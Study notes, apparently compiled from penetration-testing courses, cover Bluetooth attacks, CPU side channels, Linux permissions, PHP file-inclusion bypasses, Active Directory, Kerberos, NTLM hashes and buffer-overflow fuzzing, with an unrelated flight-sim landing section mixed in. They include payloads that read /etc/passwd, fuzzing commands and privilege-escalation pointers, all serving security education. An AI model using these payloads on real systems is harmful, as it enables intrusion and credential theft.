The technology operates by establishing personal area networks (PANs) using radio frequencies in the ISM band from 2.402 GHz to 2.480 GHz.  Device pairing:  Discovery: a device broadcast its presence to other Bluetooth devices.Pairing Request: a second device finds the broadcasted device and sends a pairing request.Authentication: the devices authenticate each other using a shared secret. This involve entering a PIN on one or both devices.  When they are paired, they can connect automatically in the future.  After pairing, Bluetooth devices form a network known as a piconet. This collection of devices connected via Bluetooth technology consists of one main device and up to seven active client devices. The main device coordinates communication within the piconet.  The main device decides which can of transmissions will happen in the piconet. There are two types of links for data transfer:  Synchronous Connection Oriented (SCO) links: used for audio communication. Guarantee uninterrumpted communication.Asynchronous Connection-Less (ACL) links: All other type of data, no reservation.  Risks of Bluetooth:  Unauthorised Access: Attackers can exploit vulnerabilities to take control of the device or eavesdrop data exchanges.Data theft: attackers might exploit vulnerabilities to extract personal and sensitive data.Interferece: Bluetooth works in the 2.4 Ghz band which is shared by many technologies. An attacker might corrupt the connections by creating intentional interferences.DoS: Attackers can overwhlem the deviceDevice tracking: attackers can track radio signals to track the physical location of the device.  Bluetooth atacks:  Bluejacking: an attacker send unsolicited messages to a device. Kind of spam. Apple devices were susceptible to an attack very similar to Bluejacking via AirDropBluesnarfing: unauthorised access to a Bluetooth device's data.Bluebugging: an attacker control a Bluetooth device. Making calls, sending messages and accessing data.Car whisperer: specifically target vehicles.

Everything in a processor works thanks to the transistors that store the 0 and 1 physically. The control unit uses combinations of these binary values to represent different commands and data. The arithmetic logic unit uses transistors based on these binary instructions to perform arithmetic and logical operations.  There are two main architectures:  CISC (Complex Instruction Set Computer): many tools in one package.RISC (Reduced Instruction Set Computer): do one thing very well.  Microprocessors can contain weaknesses or flaws in the design or implementation of microprocessors that can be exploited to compromise the security of a computing system.  Vulnerabilities exploit some optimizations like:  Speculative execution: Spectre vulnerability forces the processor to discard speculative results but they are kept in the cache for some time. The attacker can construct special machine instructions to force the speculative execution to leak the data into the cache while the execution flow goes normally. Then, a side-attack channel is used to read the cache contents.Out of order execution. The processor executes the instructions not in the sequential order defined by the program but in an order dictated by the availability of resources. The meltdown vulnerability induces an exception (attempt to access an off-limit memory location), the out-or-order execution allows further instructions that depend on this access to be executed before the exception is handled. And again, the attacker can store the results into the cache and read it with a side-channel attack.

These bits function like temporary access passes, enabling users to run certain programs with the privileges of another user or group. For example, administrators can use SUID or SGID to grant users elevated rights for specific applications, allowing tasks to be performed with the necessary permissions, even if the user themselves doesn’t normally have them.  The presence of these permissions is indicated by an s in place of the usual x in the file's permission set.  This important to notice, because it's a very good vector for privilege escalation. If a user has suid access to a binary, we can use GTFO bins to see how can we escape from that binary and have root access.  In shared directories, we can leverage Sticky bits to make sure the owner is the only one that can delete or rename files. Other users can access the directory but can't modify files they don't own.  Example:  cry0l1t3@htb[/htb]$ ls -l drw-rw-r-t 3 cry0l1t3 cry0l1t3 4096 Jan 12 12:30 scripts drw-rw-r-T 3 cry0l1t3 cry0l1t3 4096 Jan 12 12:32 reports   In this example, we see that both directories have the sticky bit set. However, the reports folder has an uppercase T, and the scripts folder has a lowercase t.  If the sticky bit is capitalized (T), then this means that all other users do not have execute (x) permissions and, therefore, cannot see the contents of the folder nor run any programs from it. The lowercase sticky bit (t) is the sticky bit where the execute (x) permissions have been set.

All processes in a Linux system are assigned a PID and can be viewed under the /proc/ directory, which contains information about each process. Processes may also have a Parent Process ID (PPID), indicating that they were started by another process (the parent), making them child processes.  systemctl start ssh # start service with systemctl systemctl status ssh # check the status systemctl enable ssh # Run this service after startup   Check the process is running:  ps -aux | grep ssh systemctl list-units --type=service # List systemctl enabled services   To debug services, use journalctl:  journalctl -u ssh.service --no-pager   To kill a process, we can use kill, pkill, pgrep and killall.

And the landing procedure is a little bit different  Approach distance calculation​  The approach will be performed at 2400ft and 300kt.  For landing, we first must compute the distance of the TACAN where the descend must start, to do so:  Current altitude - 2400ft will give the required descent altitude. E.g:  6000ft - 2400ft = 3600ft   Assuming a descent speed of 300kt and vertical speed of 2000ft/min, we can compute the distance to start the descend by:  Distance = Current altitude - airport altitude / 100 / 4, e.g:  Distance = 6000 - 2400 = 3600 / 100 = 36 / 4 = 9 NM   Then, we add 5 NM to align with the correct course and we have to start descending to approach altitude at 9 + 5 = 14 NM.  Entering downwind leg​  We land facing the wind with the cockit, the wind will make breaking the aircraft easier. In order to do so, we must fly the downwind leg and turn 180º to land.  When we reach the TACAN station at the airport, we must add 23º to the course to enter the landing course. e.g:  Landing at runway 27: 268º The reverse course is: 268 - 180 = 88º We add 23º to that: 88º + 23º = 111º   When reaching the TACAN, keep the same course for 2 NM for clear reads of TACAN signals, then configure the course to the previously computed (111º)  Fly for 13NM in 111º and turn left to landing course of 268º.  Remember to keep 2400ft and 300kt all the time.  Descending the approach​  While on landing course, slowdown to 260kt and take out the landing the gear.  tip Calculating landing speedDepends on the weight of the aircraft (fuel + ammunition): Fuel weights 1000 pounds and no ammo: 145ktMore than 1000 pounds of fuel: increase 1kt per each 200 poundsGun ammo full: add another 5kt  Keep landing speed plus 20kt during the descend phase.  When distance to TACAN is 8NM, start descending with vertical speed of 600-700 ft/min.  At 1200ft of altitude, TACAN should read 4NM of distance. You must manouver to find the optimal glide path.

Any write attempt will likely result in Segmentation Fault..data: contains global and static data defined by the program..bss: Several compilers and linkers use the this section as part of the data segment, which contains statically allocated variables represented exclusively by 0 bits.Heap: memory area allocated to each program. Memory allocated to heap can be dynamically allocated, unlike memory allocated to stacks.Stack: Least-In-First-Out memory. The return address, parameters and sometimes frame pointers are stored in the stack memory. This is where local variables are stored. The linker reserves this area and usually places the stack in RAM's lower area above the global and static variables. The contents are accessed via the stack pointer, set to the upper end of the stack during initialization. During execution, the allocated part of the stack grows down to the lower memory addresses.

The Android SDK tools compile application source code along with resource files and assets into an Android Package (APK). An APK is an archive file with a .apk extension that contains all the components needed to install and run an Android app, including compiled bytecode (.dex), manifest metadata, resources, and native libraries.  Each Android application runs within its own isolated security sandbox, enforced by the underlying Linux-based architecture. This sandboxing model is supported by several core Android security features:  Android is a multi-user Linux system where each application is treated as a separate user. By default, the system assigns each app a unique Linux user ID (UID). This UID is used by the system for access control, but is not exposed to the app itself. File system permissions ensure that only the app assigned a particular UID can access its own files. Each app runs in its own process, and each process runs in a separate instance of the Android Runtime (ART) virtual machine, ensuring memory isolation. The system launches the app's process as needed and terminates it when no longer required or when reclaiming system resources. Android enforces the principle of least privilege, meaning apps only receive the permissions necessary to perform their core functionality. Additional privileges must be explicitly declared in the app's manifest and approved by the user (or system, depending on the API level).  Android uses Linux’s user-based security model to isolate applications by assigning each app a unique user ID (UID) and running it in its own process. This creates a kernel-level application sandbox that enforces strict boundaries between apps and the system, preventing unauthorized data access or code execution across app boundaries.  Escaping this sandbox requires compromising the kernel itself, typically through a privilege escalation exploit.  We can see this, when we list the files:  root:/# ls -l /data/data/ drwx------ 4 system system 4096 2022-12-28 11:47 android drwx------ 4 bluetooth bluetooth 4096 2022-12-28 11:47 com.android.bluetooth drwx------ 5 radio radio 4096 2022-12-28 11:48 com.android.ons drwx------ 5 shell shell 4096 2022-12-28 11:49 com.android.shell drwx------ 11 u0_a114 u0_a114 4096 2022-12-30 12:41 com.android.chrome drwx------ 5 u0_a119 u0_a119 4096 2022-12-28 11:49 com.android.camera2   To install an application on a device or upload it to the Play Store, the APK file must be signed. Signing the APK is crucial for security, as it protects the package from malicious modifications.  The certificates that are used to sign an application are self-signed. One can sign an APK file with apksigner tool (Signature Scheme v4) using the following commands:  echo -e &quot;password\\npassword\\njohn doe\\ntest\\ntest\\ntest\\ntest\\ntest\\nyes&quot; &gt; params.txt cat params.txt | keytool -genkey -keystore key.keystore -validity 1000 -keyalg RSA -alias john zipalign -p -f -v 4 myapp.apk myapp_signed.apk echo password | apksigner sign --ks key.keystore myapp_signed.apk   Verified Boot is an Android security feature that ensures the integrity of the operating system.

Each vhost is associated with a unique domain name or hostname. When a client sends an HTTP request, the web server examines the Host header to determine which vhost's content to deliver.  Subdomains, on the other hand, are extensions of a primary domain name, creating a hierarchical structure within the domain. They are used to organize different sections or services within a website. For example, blog.example.com and shop.example.com are subdomains of the main domain example.com. Unlike vhosts, subdomains are resolved to specific IP addresses through DNS (Domain Name System) records.  We can use gobuster to perform vhost fuzzing:  gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/Web-Content/common.txt --append-domain   --append-domain: This crucial flag instructs Gobuster to append the base domain (inlanefreight.htb) to each word in the wordlist.

For SOAP, it's a bit different. They rely on XML-based messages and Web Services Description Language (WSDL) files to define their interfaces and operations. They expose a single endpoint which is a URL where the SOAP server listens for incoming requests. The content of the SOAP message itself determines the specific operation you want to perform.

This endpoint is usually a URL like /graphql and serves as the entry point for all queries and mutations sent to the API.  To do the discovery of the internals of the API, you can use:  Introspection: GraphQL's introspection system is a powerful tool for discovery. By sending an introspection query to the GraphQL endpoint, you can retrieve a complete schema describing the API's capabilities. This includes available types, fields, queries, mutations, and arguments. Tools and IDEs can leverage this information to offer auto-completion, validation, and documentation for your GraphQL queries.API documentation: Well-documented GraphQL APIs provide comprehensive guides and references alongside introspection. These typically explain the purpose and usage of different queries and mutations, offer examples of valid structures, and detail input arguments and response formats. Tools like GraphiQL or GraphQL Playground, often bundled with GraphQL servers, provide an interactive environment for exploring the schema and experimenting with queries.Network traffic analysis: same as REST and SOAP.

This includes query parameters (appended to the API endpoint URL), headers (containing metadata about the request), and request bodies (carrying the data payload).  Data format Fuzzing  Web APIs frequently exchange data in structured formats like JSON or XML. Data format fuzzing specifically targets these formats by manipulating the structure, content, or encoding of the data. This can reveal vulnerabilities related to parsing errors, buffer overflows, or improper handling of special characters.  Sequence Fuzzing  APIs often involve multiple interconnected endpoints, where the order and timing of requests are crucial. Sequence fuzzing examines how an API responds to sequences of requests, uncovering vulnerabilities like race conditions, insecure direct object references (IDOR), or authorization bypasses. By manipulating the order, timing, or parameters of API calls, fuzzers can expose weaknesses in the API's logic and state management.

Path Truncation​  In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (/etc/passwd/.) then the /. would also be truncated, and PHP would call (/etc/passwd). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. ////etc/passwd is the same as /etc/passwd). Similarly, a current directory shortcut (.) in the middle of the path would also be disregarded (e.g. /etc/./passwd).  If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (.php) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.  we should calculate the full length of the string to ensure only .php gets truncated  Null bytes​  Adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it.  To exploit this vulnerability, we can end our payload with a null byte (e.g. /etc/passwd%00), such that the final path passed to include() would be (/etc/passwd%00.php). This way, even though .php is appended to our string, anything after the null byte would be truncated, and so the path used would actually be /etc/passwd, leading us to bypass the appended extension.

They allow developers to access different I/O stream at application level, such as stdin, stdout, etc...  PHP filters are a special type of PHP wrappers to pass different types of input and have it filtered. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters.  The first step is to use fuff to enumerate PHP files. Normally in php LFI inclusion, the PHP gets executed and the source code cannot be seen.  For example:  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=config will execute the config.php file and we'll not see anything in the website.

A forest is the security boundary within which all objects are under administrative control. A forest may contain multiple domains, and a domain may include further child or sub-domains. A domain is a structure within which contained objects (users, computers, and groups) are accessible. It has many built-in Organizational Units (OUs), such as Domain Controllers, Users, Computers, and new OUs can be created as required. OUs may contain objects and sub-OUs, allowing for the assignment of different group policies.  One example of such tree structure might be:  INLANEFREIGHT.LOCAL/ ├── ADMIN.INLANEFREIGHT.LOCAL │ ├── GPOs │ └── OU │ └── EMPLOYEES │ ├── COMPUTERS │ │ └── FILE01 │ ├── GROUPS │ │ └── HQ Staff │ └── USERS │ └── barbara.jones ├── CORP.INLANEFREIGHT.LOCAL └── DEV.INLANEFREIGHT.LOCAL   It is common to see multiple domains (or forests) linked together via trust relationships in organizations that perform a lot of acquisitions. It is often quicker and easier to create a trust relationship with another domain/forest than recreate all new users in the current domain. Domain trusts can introduce a slew of security issues if not appropriately administered.  ","version":"Next","tagName":"h2"},{"title":"Active Directory Terminology​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#active-directory-terminology","content":" Object: An object can be defined as ANY resource present within an Active Directory environment such as OUs, printers, users, domain controllers, etc.  Attributes: Every object in Active Directory has an associated set of attributes used to define characteristics of the given object. A computer object contains attributes such as the hostname and DNS name. All attributes in AD have an associated LDAP name that can be used when performing LDAP queries, such as displayName for Full Name and given name for First Name.  Schema: The Active Directory schema is essentially the blueprint of any enterprise environment. It defines what types of objects can exist in the AD database and their associated attributes. It lists definitions corresponding to AD objects and holds information about each object.  Domain: A domain is a logical group of objects such as computers, users, OUs, groups, etc. We can think of each domain as a different city within a state or country. Domains can operate entirely independently of one another or be connected via trust relationships.  Forest: A forest is a collection of Active Directory domains. It is the topmost container and contains all of the AD objects. A forest can contain one or multiple domains and be thought of as a state in the US or a country within the EU.  Tree: A tree is a collection of Active Directory domains that begins at a single root domain. A forest is a collection of AD trees.  Container: Container objects hold other objects and have a defined place in the directory subtree hierarchy.  Leaf: Leaf objects do not contain other objects and are found at the end of the subtree hierarchy.  Global Unique Identifier (GUID): A GUID is a unique 128-bit value assigned when a domain user or group is created. This GUID value is unique across the enterprise, similar to a MAC address. Every single object created by Active Directory is assigned a GUID, not only user and group objects. GUIDs are used by AD to identify objects internally. The ObjectGUID property never changes and is associated with the object for as long as that object exists in the domain.  Security principals: Security principals are anything that the operating system can authenticate, including users, computer accounts, or even threads/processes that run in the context of a user or computer account. In AD, security principals are domain objects that can manage access to other resources within the domain. Do not get confused with local user accounts or groups; these are not managed by AD.  Security Identifier (SID): A security identifier, or SID is used as a unique identifier for a security principal or security group. Every account, group, or process has its own unique SID, which, in an AD environment, is issued by the domain controller and stored in a secure database. A SID can only be used once. Even if the security principle is deleted, it can never be used again in that environment to identify another user or group. When a user logs in, the system creates an access token for them which contains the user's SID, the rights they have been granted, and the SIDs for any groups that the user is a member of.  Distinguished Name (DN): A Distinguished Name (DN) describes the full path to an object in AD (such as cn=bjones, ou=IT, ou=Employees, dc=inlanefreight, dc=local). In this example, the user bjones works in the IT department of the company Inlanefreight, and his account is created in an Organizational Unit (OU) that holds accounts for company employees. The Common Name (CN) bjones is just one way the user object could be searched for or accessed within the domain.  Relative Distinguished Name (RDN): A Relative Distinguished Name (RDN) is a single component of the Distinguished Name that identifies the object as unique from other objects at the current level in the naming hierarchy. In our example, bjones is the Relative Distinguished Name of the object. AD does not allow two objects with the same name under the same parent container, but there can be two objects with the same RDNs that are still unique in the domain because they have different DNs. For example, the object cn=bjones,dc=dev,dc=inlanefreight,dc=local would be recognized as different from cn=bjones,dc=inlanefreight,dc=local. DN should be unique in the whole directory, RDN should be unique in an OU.  sAMAccountName: The sAMAccountName is the user's logon name. Here it would just be bjones. It must be a unique value and 20 or fewer characters.  userPrincipalName: The userPrincipalName attribute is another way to identify users in AD. This attribute consists of a prefix (the user account name) and a suffix (the domain name) in the format of bjones@inlanefreight.local. This attribute is not mandatory.  FSMO Roles: Flexible Single Master Operation (FSMO) roles. These give Domain Controllers (DC) the ability to continue authenticating users and granting permissions without interruption (authorization and authentication). There are five FSMO roles: Schema Master and Domain Naming Master (one of each per forest), Relative ID (RID) Master (one per domain), Primary Domain Controller (PDC) Emulator (one per domain), and Infrastructure Master (one per domain).  Global Catalog: A global catalog (GC) is a domain controller that stores copies of ALL objects in an Active Directory forest. The GC stores a full copy of all objects in the current domain and a partial copy of objects that belong to other domains in the forest  Read-Only Domain Controller (RODC): A Read-Only Domain Controller (RODC) has a read-only Active Directory database.  Replication: Replication happens in AD when AD objects are updated and transferred from one Domain Controller to another.  Service Principal Name (SPN): A Service Principal Name (SPN) uniquely identifies a service instance. They are used by Kerberos authentication to associate an instance of a service with a logon account, allowing a client application to request the service to authenticate an account without needing to know the account name.  Group Policy Object (GPO): Group Policy Objects (GPOs) are virtual collections of policy settings. Each GPO has a unique GUID. A GPO can contain local file system settings or Active Directory settings. GPO settings can be applied to both user and computer objects. They can be applied to all users and computers within the domain or defined more granularly at the OU level.  Access Control List (ACL): An Access Control List (ACL) is the ordered collection of Access Control Entries (ACEs) that apply to an object.  Access Control Entries (ACEs): Each Access Control Entry (ACE) in an ACL identifies a trustee (user account, group account, or logon session) and lists the access rights that are allowed, denied, or audited for the given trustee.  Discretionary Access Control List (DACL): DACLs define which security principles are granted or denied access to an object; it contains a list of ACEs. When a process tries to access a securable object, the system checks the ACEs in the object's DACL to determine whether or not to grant access. If an object does NOT have a DACL, then the system will grant full access to everyone, but if the DACL has no ACE entries, the system will deny all access attempts. ACEs in the DACL are checked in sequence until a match is found that allows the requested rights or until access is denied.  System Access Control Lists (SACL): Allows for administrators to log access attempts that are made to secured objects. ACEs specify the types of access attempts that cause the system to generate a record in the security event log.  Fully Qualified Domain Name (FQDN): complete name for a specific computer or host. E.g.: DC01.INLANEFREIGHT.LOCAL. The format is [host name].[domain name].[tld].  Tombstone: A tombstone is a container object in AD that holds deleted AD objects. When an object is deleted from AD, the object remains for a set period of time known as the Tombstone Lifetime, and the isDeleted attribute is set to TRUE. Once an object exceeds the Tombstone Lifetime, it will be entirely removed.  AD Recycle Bin: Makes it easier for sysadmins to restore objects, avoiding the need to restore from backups, restarting Active Directory Domain Services (AD DS), or rebooting a Domain Controller.  SYSVOL: The SYSVOL folder, or share, stores copies of public files in the domain such as system policies, Group Policy settings, logon/logoff scripts, and often contains other types of scripts that are executed to perform various tasks in the AD environment.  AdminSDHolder: The AdminSDHolder object is used to manage ACLs for members of built-in groups in AD marked as privileged. It acts as a container that holds the Security Descriptor applied to members of protected groups. The SDProp (SD Propagator) process runs on a schedule of each hour. When this process runs, it checks members of protected groups to ensure that the correct ACL is applied to them.  dsHeuristics: The dsHeuristics attribute is a string value set on the Directory Service object used to define multiple forest-wide configuration settings.  adminCount: The adminCount attribute determines whether or not the SDProp process protects a user. If the value is set to 0 or not specified, the user is not protected. If the attribute value is set to 1, the user is protected.  Active Directory Users and Computers (ADUC): ADUC is a GUI console commonly used for managing users, groups, computers, and contacts in AD.  ADSI Edit: It is a powerful GUI tool that allows a user to access AD at a much deeper level.  sIDHistory: This attribute holds any SIDs that an object was assigned previously. It is usually used in migrations so a user can maintain the same level of access when migrated from one domain to another. This attribute can potentially be abused if set insecurely, allowing an attacker to gain prior elevated access that an account had before a migration if SID Filtering (or removing SIDs from another domain from a user's access token that could be used for elevated access) is not enabled.  NTDS.DIT: The NTDS.DIT file can be considered the heart of Active Directory. It is stored on a Domain Controller at C:\\Windows\\NTDS\\ and is a database that stores AD data such as information about user and group objects, group membership, and, most important to attackers and penetration testers, the password hashes for all users in the domain. Once full domain compromise is reached, an attacker can retrieve this file, extract the hashes, and either use them to perform a pass-the-hash attack or crack them offline using a tool such as Hashcat to access additional resources in the domain.  MSBROWSE: MSBROWSE is a Microsoft networking protocol that was used in early versions of Windows-based local area networks (LANs) to provide browsing services. It was used to maintain a list of resources, such as shared printers and files, that were available on the network, and to allow users to easily browse and access these resources.

As part of Active Directory Domain Services (AD DS), Domain Controllers have a Kerberos Key Distribution Center (KDC) that issues tickets.  When a user initiates a login request to a system, they request a ticket from the KDC, encrypting the request with the user's password. If the KDC can decrypt the request (AS-REQ) using their password, it will create a Ticket Granting Ticket (TGT) and transmit it to the user.  The user then presents its TGT to a Domain Controller to request a Ticket Granting Service (TGS) ticket, encrypted with the associated service's NTLM password hash.  Finally, the client requests access to the required service by presenting the TGS to the application or service, which decrypts it with its password hash. If the entire process completes appropriately, the user will be permitted to access the requested service or application.  The password is never transmitted over the network.  The Kerberos Key Distribution Centre (KDC) does not record previous transactions (it is stateless). Instead, the Kerberos Ticket Granting Service ticket (TGS) relies on a valid Ticket Granting Ticket (TGT). It assumes that if the user has a valid TGT, they must have proven their identity.  More in depth:  KRB_AS_REQ: The user sends a timestamp encrypted with their password to the KDC. This is the request to the TGT (Ticket Granting Ticket).KRB_AS_REP: The KDC verifies the user information and generates and encrypts the TGT message with its private key (the secret key of the krbtgt account). Then, the TGT message is passed to the user.KRB_TGS_REQ: The user presents the TGT to the DC and request a Ticket Granting Service (TGS) to access certain serviceKRB_TGS_REP: The TGS is encrypted with the hash NTLM password of the service or computer account that is running the KDC.KRB_AP_REQ: The user presents the TGS to the service.

LDAP is an open-source and cross-platform protocol used for authentication against various directory services (such as AD).  AD stores user account information and security information such as passwords and facilitates sharing this information with other devices on the network. LDAP is the language that applications use to communicate with other servers that provide directory services. In other words, LDAP is how systems in the network environment can &quot;speak&quot; to AD.  An LDAP session begins by first connecting to an LDAP server, also known as a Directory System Agent. The Domain Controller in AD actively listens for LDAP requests, such as security authentication requests.  The relationship between AD and LDAP can be compared to Apache and HTTP. The same way Apache is a web server that uses the HTTP protocol, Active Directory is a directory server that uses the LDAP protocol.  There are two types of LDAP authentication:  Simple Authentication: This includes anonymous authentication, unauthenticated authentication, and username/password authentication. Simple authentication means that a username and password create a BIND request to authenticate to the LDAP server. SASL Authentication: The Simple Authentication and Security Layer (SASL) framework uses other authentication services, such as Kerberos, to bind to the LDAP server and then uses this authentication service (Kerberos in this example) to authenticate to LDAP.  LDAP authentication messages are sent in cleartext by default so anyone can sniff out LDAP messages on the internal network.

IT administrators use the protocol to manage users, groups, and computers by enabling admins to create, read, update, and delete information about security principles. Attackers (and pentesters) can use the samr protocol to perform reconnaissance about the internal domain using tools such as BloodHound to visually map out the AD network and create &quot;attack paths&quot; to illustrate visually how administrative access or full domain compromise could be achieved. Organizations can protect against this type of reconnaissance by changing a Windows registry key to only allow administrators to perform remote SAM queries since, by default, all authenticated domain users can make these queries to gather a considerable amount of information about the AD domain. drsuapi\tdrsuapi is the Microsoft API that implements the Directory Replication Service (DRS) Remote Protocol which is used to perform replication-related tasks across Domain Controllers in a multi-DC environment.

These include LM, NTLM, NTLMv1, and NTLMv2.  LM​  LAN Manager (LM or LANMAN) hashes are the oldest password storage mechanism used by the Windows operating system. If in use, they are stored in the SAM database on a Windows host and the NTDS.DIT database on a Domain Controller.  Due to significant security weaknesses in the hashing algorithm used for LM hashes, it has been turned off by default since Windows Vista/Server 2008.  Passwords using LM are limited to a maximum of 14 characters. Passwords are not case sensitive and are converted to uppercase before generating the hashed value, limiting the keyspace to a total of 69 characters making it relatively easy to crack these hashes using a tool such as Hashcat.  An LM hash takes the form of 299bd128c1101fd6.  NTHash (NTLM)​  NT LAN Manager (NTLM) hashes are used on modern Windows systems. It is a challenge-response authentication protocol and uses three messages to authenticate: a client first sends a NEGOTIATE_MESSAGE to the server, whose response is a CHALLENGE_MESSAGE to verify the client's identity. Lastly, the client responds with an AUTHENTICATE_MESSAGE. These hashes are stored locally in the SAM database or the NTDS.DIT database file on a Domain Controller.  NTLM is also vulnerable to the pass-the-hash attack, which means an attacker can use just the NTLM hash (after obtaining via another successful attack) to authenticate to target systems where the user is a local admin without needing to know the cleartext value of the password.  An NT hash takes the form of b4b9b02e6f09a9bd760f388b67351e2b, which is the second half of the full NTLM hash. An NTLM hash looks like this: Rachel:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2:::  Rachel is the username500 is the Relative Identifier (RID). 500 is the known RID for the administrator accountaad3c435b514a4eeaad3b935b51304fe is the LM hash and, if LM hashes are disabled on the system, can not be used for anythinge46b9e548fa0d122de7f59fb6d48eaa2 is the NT hash. This hash can either be cracked offline to reveal the cleartext value (depending on the length/strength of the password) or used for a pass-the-hash attack.  NTLMv1​  The protocol is used for network authentication, and the Net-NTLMv1 hash itself is created from a challenge/response algorithm. NTLMv1 uses both the NT and the LM hash, which can make it easier to &quot;crack&quot; offline after capturing a hash  NTLMv2​  Stronger alternative to NTLMv1. It is hardened against certain spoofing attacks that NTLMv1 is susceptible to.

Groups are primarily used to assign permissions to access resources.  Groups in Active Directory have two fundamental characteristics: type and scope. The group type defines the group's purpose, while the group scope shows how the group can be used within the domain or forest. When creating a new group, we must select a group type. There are two main types: security and distribution groups.  The Security groups type is primarily for ease of assigning permissions and rights to a collection of users instead of one at a time.  The Distribution groups type is used by email applications such as Microsoft Exchange to distribute messages to group members  There are three different group scopes that can be assigned when creating a new group.  Domain Local Group: only access resources in the domain the group was created.  Global Group: can access resources in another domain.  Universal Group: The universal group scope can be used to manage resources distributed across multiple domains and can be given permissions to any object within the same forest.

AD contains many default or built-in security groups, some of which grant their members powerful rights and privileges which can be abused. Some of them are listed below:  Group Name\tDescriptionAccount Operators\tMembers can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers. They cannot manage the Administrator account, administrative user accounts, or members of the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Administrators\tMembers have full and unrestricted access to a computer or an entire domain if they are in this group on a Domain Controller. Backup Operators\tMembers can back up and restore all files on a computer, regardless of the permissions set on the files. Backup Operators can also log on to and shut down the computer. Members can log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, which, if taken, can be used to extract credentials and other juicy info. DnsAdmins\tMembers have access to network DNS information. The group will only be created if the DNS server role is or was at one time installed on a domain controller in the domain. Domain Admins\tMembers have full access to administer the domain and are members of the local administrator's group on all domain-joined machines. Domain Computers\tAny computers created in the domain (aside from domain controllers) are added to this group. Domain Controllers\tContains all DCs within a domain. New DCs are added to this group automatically. Domain Guests\tThis group includes the domain's built-in Guest account. Members of this group have a domain profile created when signing onto a domain-joined computer as a local guest. Domain Users\tThis group contains all user accounts in a domain. A new user account created in the domain is automatically added to this group. Enterprise Admins\tMembership in this group provides complete configuration access within the domain. The group only exists in the root domain of an AD forest. Members in this group are granted the ability to make forest-wide changes such as adding a child domain or creating a trust. The Administrator account for the forest root domain is the only member of this group by default. Event Log Readers\tMembers can read event logs on local computers. The group is only created when a host is promoted to a domain controller. Group Policy Creator Owners\tMembers create, edit, or delete Group Policy Objects in the domain. Hyper-V Administrators\tMembers have complete and unrestricted access to all the features in Hyper-V. If there are virtual DCs in the domain, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins. IIS_IUSRS\tThis is a built-in group used by Internet Information Services (IIS), beginning with IIS 7.0. Pre–Windows 2000 Compatible Access\tThis group exists for backward compatibility for computers running Windows NT 4.0 and earlier. Membership in this group is often a leftover legacy configuration. It can lead to flaws where anyone on the network can read information from AD without requiring a valid AD username and password. Print Operators\tMembers can manage, create, share, and delete printers that are connected to domain controllers in the domain along with any printer objects in AD. Members are allowed to log on to DCs locally and may be used to load a malicious printer driver and escalate privileges within the domain. Protected Users\tMembers of this group are provided additional protections against credential theft and tactics such as Kerberos abuse. Read-only Domain Controllers\tContains all Read-only domain controllers in the domain. Remote Desktop Users\tThis group is used to grant users and groups permission to connect to a host via Remote Desktop (RDP). This group cannot be renamed, deleted, or moved. Remote Management Users\tThis group can be used to grant users remote access to computers via Windows Remote Management (WinRM). Schema Admins\tMembers can modify the Active Directory schema, which is the way all objects with AD are defined. This group only exists in the root domain of an AD forest. The Administrator account for the forest root domain is the only member of this group by default. Server Operators\tThis group only exists on domain controllers. Members can modify services, access SMB shares, and backup files on domain controllers. By default, this group has no members.  Below there are listed some interesting user privileges:  Privilege\tDescriptionSeRemoteInteractiveLogonRight\tThis privilege could give our target user the right to log onto a host via Remote Desktop (RDP), which could potentially be used to obtain sensitive data or escalate privileges. SeBackupPrivilege\tThis grants a user the ability to create system backups and could be used to obtain copies of sensitive system files that can be used to retrieve passwords such as the SAM and SYSTEM Registry hives and the NTDS.dit Active Directory database file. SeDebugPrivilege\tThis allows a user to debug and adjust the memory of a process. With this privilege, attackers could utilize a tool such as Mimikatz to read the memory space of the Local System Authority (LSASS) process and obtain any credentials stored in memory. SeImpersonatePrivilege\tThis privilege allows us to impersonate a token of a privileged account such as NT AUTHORITY\\SYSTEM. This could be leveraged with a tool such as JuicyPotato, RogueWinRM, PrintSpoofer, etc., to escalate privileges on a target system. SeLoadDriverPrivilege\tA user with this privilege can load and unload device drivers that could potentially be used to escalate privileges or compromise a system. SeTakeOwnershipPrivilege\tThis allows a process to take ownership of an object. At its most basic level, we could use this privilege to gain access to a file share or a file on a share that was otherwise not accessible to us.

When we send a string that is longer than expected, it overwrites other existing values on the stack and would even overwrite the entire stack if it is long enough. Most importantly, we see that it overwrote the value at EIP,  This happens because of the LIFO design of the stack, which grows upwards, while a long string overflows values downwards until it eventually overwrites the return address EIP and the bottom of the stack pointer EBP.  Whenever a function is called, a new stack frame is created, and the old EIP address gets pushed to the top of the new stack frame, so the program knows where to return once the function is finished.  If we calculate our input precisely, we can place a valid address in the location where EIP is stored.

Another common thing we should look for is fields that are expected to be processed somehow, like the license number registration field, as it will probably be run on a specific function to test whether it is a correct license number. The same applies to opened files, as opened files tend to be processed after being opened.  For example for fuzzing text input file, we can generate a long input with:  python -c &quot;print('A'*10000)&quot;   and pass it to the input, if the program crash, most likely it's because of buffer overflow.  If the application allows to load files, we can leverage a similar technique. One can write dummy data to a file and have it loaded in the application:  python -c &quot;print('A'*10000, file=open('fuzz.wav', 'w'))&quot;   When we open the file in the application, the application crash, which is a good sympton to spotting the vulnerability.

